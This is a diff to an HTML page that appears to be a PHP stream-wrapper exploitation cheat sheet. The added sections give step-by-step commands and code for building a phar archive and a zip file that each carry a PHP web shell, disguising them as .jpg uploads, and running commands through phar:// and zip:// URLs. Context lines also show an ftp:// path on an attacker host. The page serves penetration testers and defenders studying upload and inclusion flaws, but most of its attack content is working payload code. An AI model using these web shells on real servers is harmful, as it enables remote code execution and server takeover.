@@ -82,7 +82,19 @@ ftp://user:pass@attacker.com/evil.txt</code></pre>
                     <ul>
                        <p>Find pathnames matching pattern</p>
                        <p>An attacker may use it to upload files to the server with changed extensions then using phar:// we can execute the uploaded file</p>
-                       <pre><code class="language-php">phar:///var/www/html/uploads/evil.phar</code></pre>  
+
+                       <p>Creation of the payload</p>
+                       <pre><code class="language-php">&lt;?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '&lt;?php system($_GET["cmd"]); ?&gt;');
+$phar->setStub('&lt;?php __HALT_COMPILER(); ?&gt;');
+
+$phar->stopBuffering();</code></pre>
+                    <p>Then compile the code</p>
+                    <pre><code class="language-php">php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg</code></pre>
+                    <p>Finally execute the script</p>
+                    <pre><code class="language-php">phar://./profile_images/shell.jpg/shell.txt&cmd=id</code></pre>  
                     </ul>
                 
                 <h3>ssh2://</h3>
@@ -95,6 +107,16 @@ ftp://user:pass@attacker.com/evil.txt</code></pre>
                         <p>Access files inside RAR file</p>
                         <pre><code class="language-php">rar:///var/www/html/backups/config.rar#config.php</code></pre>  
                     </ul>
+                
+                <h3>zip://</h3>
+                    <ul>
+                        <p>Access files inside zip file</p>
+                        <p>Creation of the payload</p>
+                        <pre><code class="language-php">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php && zip shell.jpg shell.php</code></pre>
+                        <p>Access the file</p>
+                        <pre><code class="language-php">zip://./profile_images/shell.jpg#shell.php&cmd=id</code></pre>  
+                    </ul>    
+                    
                 <h3>ogg://</h3>
                     <ul>
                         <p>Audio streams - Abuse for arbitrary file reading if audio file path controlled:</p>
